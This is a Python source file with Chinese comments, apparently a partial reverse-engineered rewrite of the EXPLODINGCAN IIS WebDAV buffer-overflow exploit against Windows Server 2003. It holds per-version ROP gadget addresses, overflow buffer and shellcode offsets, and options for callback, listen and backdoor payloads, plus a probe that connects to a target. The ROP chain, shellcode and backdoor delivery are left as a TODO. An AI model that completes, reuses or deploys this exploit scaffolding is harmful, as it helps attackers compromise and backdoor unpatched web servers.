"""exploding_can — EXPLODINGCAN (MS03-007 / EXCA) IIS WebDAV 利用核心逻辑。

Python 重写的 `Explodingcan-2.0.2.exe` (C++ / DAVE framework)。
通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 IIS WebDAV 缓冲区溢出 / ROP 链利用流程。

参数定义来源：Explodingcan-2.0.2.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 80
DEFAULT_TIMEOUT = 60
DEFAULT_IIS_PATH_SIZE = 18
DEFAULT_HOST_STRING = "localhost"

PAYLOAD_ACCESS_TYPE_VALUES = {
    "Callback": 0,
    "Listen":   1,
    "Backdoor": 2,
}

AUTH_TYPE_VALUES = {
    "None":  0,
    "Basic": 1,
}

BACKDOOR_HEADER_VALUES = {
    "Accept":               20,
    "Accept-Charset":       21,
    "Accept-Encoding":      22,
    "Accept-Language":      23,
    "Allow":                10,
    "Authorization":        24,
    "Cache-Control":        0,
    "Content-Encoding":     13,
    "Content-Language":     14,
    "Content-Location":     15,
    "Content-MD5":          16,
    "Content-Range":        17,
    "Content-Type":         12,
    "Cookie":               25,
    "Date":                 2,
    "Expect":               26,
    "Expires":              18,
    "From":                 27,
    "If-Match":             29,
    "If-Modified-Since":    30,
    "If-None-Match":        31,
    "If-Range":             32,
    "If-Unmodified-Since":  33,
    "Last-Modified":        19,
    "Max-Forwards":         34,
    "Pragma":               4,
    "Proxy-Authorization":  35,
    "Range":                37,
    "Referer":              36,
    "Trailer":              5,
    "Translate":            39,
    "Upgrade":              7,
    "User-Agent":           40,
    "Via":                  8,
    "Warning":              9,
}

BACKDOOR_VALUE_SOURCE_VALUES = {
    "Manual":        0,
    "RandomEtag":    1,
    "RandomBasicAuth": 2,
}

# 每个目标 OS 的 ROP gadget 地址（来自 XML <Target> <paramgroup>）
TARGET_OS_GADGETS = {
    "W2K3SP0": {
        "WriteAddress":     0x01002030,
        "MovEcxEsp":        0xffffffff,
        "StackAdjust":      0xffffffff,
        "Push40":           0xffffffff,
        "LeaveRet":         0xffffffff,
        "MovEbp":           0xffffffff,
        "JmpEBX":           0xffffffff,
        "SyscallAddress":   0xffffffff,
        "VProtSize":        0x01002034,
        "LoadEax":          0xffffffff,
        "EaxValAddress":    0xffffffff,
        "LoadEax2":         0xffffffff,
    },
    "W2K3SP1": {
        "WriteAddress":     0x01003030,
        "MovEcxEsp":        0x68015cd2,
        "StackAdjust":      0x68006d5f,
        "Push40":           0x6800b023,
        "LeaveRet":         0x6801277f,
        "MovEbp":           0x68006d15,
        "JmpEBX":           0x6801227b,
        "SyscallAddress":   0x7ffe0300,
        "VProtSize":        0x6802906c,
        "LoadEax":          0x680092a1,
        "EaxValAddress":    0x68008156,
        "LoadEax2":         0x680229a1,
    },
    "W2K3SP2": {
        "WriteAddress":     0x680312c0,
        "MovEcxEsp":        0x68016082,
        "StackAdjust":      0x68006e4f,
        "Push40":           0x6800b113,
        "LeaveRet":         0x680129e7,
        "MovEbp":           0x68006e05,
        "JmpEBX":           0x680124e3,
        "SyscallAddress":   0x7ffe0300,
        "VProtSize":        0x6803046e,
        "LoadEax":          0x68009391,
        "EaxValAddress":    0x68008246,
        "LoadEax2":         0x68021daa,
    },
    "W2K3SP0_v5IM": {
        "WriteAddress":     0x01004230,
        "MovEcxEsp":        0xffffffff,
        "StackAdjust":      0xffffffff,
        "Push40":           0xffffffff,
        "LeaveRet":         0xffffffff,
        "MovEbp":           0xffffffff,
        "JmpEBX":           0xffffffff,
        "SyscallAddress":   0xffffffff,
        "VProtSize":        0x01004234,
        "LoadEax":          0xffffffff,
        "EaxValAddress":    0xffffffff,
        "LoadEax2":         0xffffffff,
    },
    "W2K3SP1_v5IM": {
        "WriteAddress":     0x01004200,
        "MovEcxEsp":        0x68015cd2,
        "StackAdjust":      0x68006d5f,
        "Push40":           0x6800b023,
        "LeaveRet":         0x6801277f,
        "MovEbp":           0x68006d15,
        "JmpEBX":           0x6801227b,
        "SyscallAddress":   0x7ffe0300,
        "VProtSize":        0x6802906c,
        "LoadEax":          0x680092a1,
        "EaxValAddress":    0x68008156,
        "LoadEax2":         0x680229a1,
    },
}

# 通用偏移量（来自 XML hidden 参数）
OFFSETS = {
    "buf1size":             0x110,
    "buf2size":             0xc00,
    "SkipFree":             0x02020202,
    "SkipOffset":           0xdc,
    "VirtualProtectOffset": 0x11c,
    "WriteAddressOffset1":  0xe0,
    "WriteAddressOffset2":  0x124,
    "ObjectAddress":        0x100,
    "ObjectAddressOffset1": 0x10c,
    "ObjectAddressOffset4": 0xfc,
    "ObjectAddressOffset2": 0xe8,
    "ObjectAddressOffset3": 0xd8,
    "MovEcxEspOffset":      0xfc,
    "StackAdjustOffset1":   0xdc,
    "StackAdjustOffset2":   0xe0,
    "StackAdjustOffset3":   0x138,
    "Push40Offset":         0x10c,
    "LeaveRetOffset1":      0x134,
    "LeaveRetOffset2":      0x174,
    "SetEbp1":              0x174,
    "SetEbp1Offset":        0x130,
    "SetEbp2":              0x15c,
    "SetEbp2Offset":        0x14c,
    "SetEbp3":              0x138,
    "SetEbp3Offset":        0x170,
    "MovEbpOffset":         0x150,
    "ShellcodeAddr":        0x1a0,
    "ShellcodeAddrOffset":  0x118,
    "ShellcodeOffset":      0x178,
    "JmpEBXOffset":         0x114,
    "ProcHandleOffset":     0x120,
    "VProtSizeOffset":      0x128,
    "LoadEaxOffset":        0x138,
    "EaxValOffset":         0x160,
    "LoadEax2Offset":       0x168,
}


class ExplodingCanError(Exception):
    pass


def build_http_request(target, host_string, port, path, enable_ssl=False,
                       auth_type="None", username=None, password=None):
    """构建 HTTP 请求（GET/HEAD 等）。"""
    scheme = "https" if enable_ssl else "http"
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host_string}:{port}\r\n"
        f"Connection: close\r\n"
    )
    if auth_type == "Basic" and username and password:
        import base64
        creds = base64.b64encode(f"{username}:{password}".encode()).decode()
        request += f"Authorization: Basic {creds}\r\n"
    request += "\r\n"
    return request.encode("ascii")


def connect(target_ip, port, timeout, enable_ssl=False):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    enable_ssl=False,
    iis_path_size=DEFAULT_IIS_PATH_SIZE,
    host_string=DEFAULT_HOST_STRING,
    auth_type="None",
    username=None,
    password=None,
    payload_access_type="Callback",
    callback_ip=None,
    callback_port=None,
    callback_local_port=None,
    listen_port=None,
    listen_local_port=None,
    callin_timeout=10,
    backdoor=False,
    backdoor_header="If-Match",
    backdoor_value_source="RandomEtag",
    backdoor_value=None,
    backdoor_delay=10,
    backdoor_retries=1,
    target_os="W2K3SP2",
    verbose=False,
):
    """执行 EXPLODINGCAN 利用序列。

    当前阶段：完成参数解析、HTTP 连接构建。
    具体 exploit 缓冲区（WebDAV 溢出缓冲、ROP 链、shellcode、后门
    投递等）的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] SSL: {enable_ssl}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] IIS path size: {iis_path_size}")
        print(f"[*] Host string: {host_string}")
        print(f"[*] Auth type: {auth_type}")
        print(f"[*] Payload access type: {payload_access_type}")
        print(f"[*] Target OS: {target_os}")
        if backdoor:
            print(f"[*] Backdoor header: {backdoor_header}")
            print(f"[*] Backdoor value source: {backdoor_value_source}")
            print(f"[*] Backdoor delay: {backdoor_delay}s, retries: {backdoor_retries}")

    # 解析常量
    payload_access_value = PAYLOAD_ACCESS_TYPE_VALUES[payload_access_type]
    auth_value = AUTH_TYPE_VALUES[auth_type]
    backdoor_header_value = BACKDOOR_HEADER_VALUES[backdoor_header]
    backdoor_value_source_value = BACKDOOR_VALUE_SOURCE_VALUES[backdoor_value_source]
    gadgets = TARGET_OS_GADGETS[target_os]

    if verbose:
        print(f"[*] Payload access type value: {payload_access_value}")
        print(f"[*] Auth value: {auth_value}")
        print(f"[*] Backdoor header value: {backdoor_header_value}")
        print(f"[*] Backdoor value source value: {backdoor_value_source_value}")
        print(f"[*] WriteAddress: 0x{gadgets['WriteAddress']:08X}")
        print(f"[*] JmpEBX: 0x{gadgets['JmpEBX']:08X}")
        print(f"[*] Shellcode offset: 0x{OFFSETS['ShellcodeOffset']:03X}")

    # 构建 HTTP 请求（探测阶段）
    path = "/" + "A" * iis_path_size
    request = build_http_request(
        target, host_string, port, path,
        enable_ssl=enable_ssl,
        auth_type=auth_type,
        username=username,
        password=password,
    )

    # 建立 TCP 连接
    try:
        sock = connect(target, port, timeout, enable_ssl=enable_ssl)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise ExplodingCanError(f"无法连接到 {target}:{port}: {exc}") from exc

    # 发送 HTTP 请求
    try:
        sock.sendall(request)
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise ExplodingCanError(f"HTTP 请求失败: {exc}") from exc

    if verbose:
        first_line = resp.split(b"\r\n")[0] if resp else b"<empty>"
        print(f"[*] HTTP 应答首行: {first_line}")

    sock.close()

    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
    #   - WebDAV 溢出缓冲 (buf1size=0x110, buf2size=0xc00)
    #   - ROP 链 (MovEcxEsp, StackAdjust, Push40, LeaveRet, JmpEBX, 等)
    #   - VirtualProtect 调用 (VProtSize, LoadEax, EaxValAddress, LoadEax2)
    #   - Shellcode 注入 (ShellcodeAddr, ShellcodeOffset)
    #   - 后门 (BackdoorBridgeDLL, PccpPyc, PythonExe)
    #   - Payload: Callback / Listen / Backdoor

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
